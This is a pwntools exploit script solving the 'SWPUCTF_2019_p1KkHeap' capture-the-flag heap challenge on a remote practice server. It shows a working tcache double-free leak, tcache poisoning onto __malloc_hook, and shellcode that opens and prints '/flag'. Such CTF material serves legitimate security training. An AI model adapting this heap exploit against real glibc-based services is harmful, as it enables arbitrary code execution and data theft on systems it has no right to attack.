from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('SWPUCTF_2019_p1KkHeap')
io = remote('node4.buuoj.cn', 28290)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('SWPUCTF_2019_p1KkHeap')


def add(size):
    io.sendlineafter('Your Choice: ', '1')
    io.sendlineafter('size: ', str(size))


def show(id):
    io.sendlineafter('Your Choice: ', '2')
    io.sendlineafter('id: ', str(id))
    io.recvuntil('content: ')
    return io.recvline()[:-1]


def edit(id, content):
    io.sendlineafter('Your Choice: ', '3')
    io.sendlineafter('id: ', str(id))
    io.sendafter('content: ', content)


def delete(id):
    io.sendlineafter('Your Choice: ', '4')
    io.sendlineafter('id: ', str(id))


def leak_libc():
    global heap_base, libc_base
    add(0x80)   # 0 0x250  
    add(0x10)   # 1 0x2e0                                    
    delete(0)
    delete(0)
    heap_base = u64(show(0).ljust(8, b'\x00')) - 0x260
    log.success('heap_base: ' + hex(heap_base))
    add(0x80)   # 2 0x250
    edit(2, p64(heap_base + 0x80))
    add(0x80)   # 3 0x250
    add(0x80)   # 4 0x70
    delete(0)
    libc_base = u64(show(0).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    edit(4, p64(0x66660000) + p64(0) + p64(__malloc_hook))
    shellcode = shellcraft.open('/flag')
    shellcode += shellcraft.read(3, 0x66660800, 0x40)
    shellcode += shellcraft.write(1, 0x66660800, 0x40)
    add(0x70)   # 5 0x66660000
    edit(5, asm(shellcode))
    add(0x90)   # 6 __malloc_hook
    edit(6, p64(0x66660000))
    add(1)
    flag = io.recvline()
    log.success(flag)
    # gdb.attach(io)
    # pause()


if __name__ == '__main__':
    leak_libc()
    pwn()
